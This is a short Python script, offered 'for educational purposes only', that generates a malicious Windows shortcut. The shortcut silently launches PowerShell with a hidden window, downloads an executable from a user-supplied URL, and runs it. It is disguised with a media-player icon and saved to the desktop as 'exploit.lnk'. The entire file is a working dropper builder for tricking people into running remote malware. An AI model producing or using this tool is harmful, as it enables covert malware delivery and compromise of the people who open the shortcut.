'Created by:  MrKnol'
'This Script is intended for Eductional Purposes Only'
'Install the following modules'
'pip install winshell'
'pip install pypiwin32'

import os, winshell
from win32com.client import Dispatch

extension = ".lnk"
exe = ".exe"
location = input(" Enter URL to Download & Execute File: \n")
drop = input("Enter the location where you want the file to be dropped: \n")
filenamee = input ("\n Enter a FileName for your Shortcut:")
arguments = "-windowstyle hidden Invoke-WebRequest "+location+" -Outfile "+drop+"\\"+filenamee+exe+"; Start-Process "+drop+"\\"+filenamee+exe
filename = "exploit"

desktop = winshell.desktop()
path = os.path.join(desktop, filename+extension)
target = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
wDir = r"C:\Windows\System32\WindowsPowerShell\v1.0" 
icon = r"C:\Windows\System32\wmploc.dll"

shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.Arguments = arguments
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()
